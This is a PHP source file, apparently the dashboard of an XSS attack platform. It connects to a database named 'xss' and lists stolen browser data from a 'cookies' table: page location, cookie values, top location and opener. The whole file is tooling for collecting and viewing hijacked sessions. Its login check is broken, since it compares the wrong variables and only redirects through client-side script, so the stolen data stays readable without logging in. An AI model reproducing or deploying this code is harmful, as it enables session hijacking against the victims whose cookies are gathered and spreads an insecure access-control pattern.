<?php  


// session开始  
session_start();  
	
if ($p_user != $_SESSION['password'] && $p_pass != $_SESSION['name']){
$page="login.php";   
echo "<script>window.location = \"".$page."\";</script>";  
}

$conn = mysql_connect(SAE_MYSQL_HOST_M.':'.MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
if (!$conn)
  {
  die('Could not connect: ' . mysql_error());
  }

mysql_select_db("xss", $conn);
$result = mysql_query("SELECT * FROM cookies");

echo "<table border='1'>
<tr>
<th>location</th>
<th>cookie</th>
<th>toplocation</th>
<th>opener</th>
</tr>";

while($row = mysql_fetch_array($result))
  {
	  echo "<tr>";
	  echo "<td>" . $row['location'] . "</td>";
	  echo "<td>" . $row['cookie'] . "</td>";
	  echo "<td>" . $row['toplocation'] . "</td>";
	  echo "<td>" . $row['opener'] . "</td>";
	  echo "</tr>";
  }
mysql_close($conn);


?>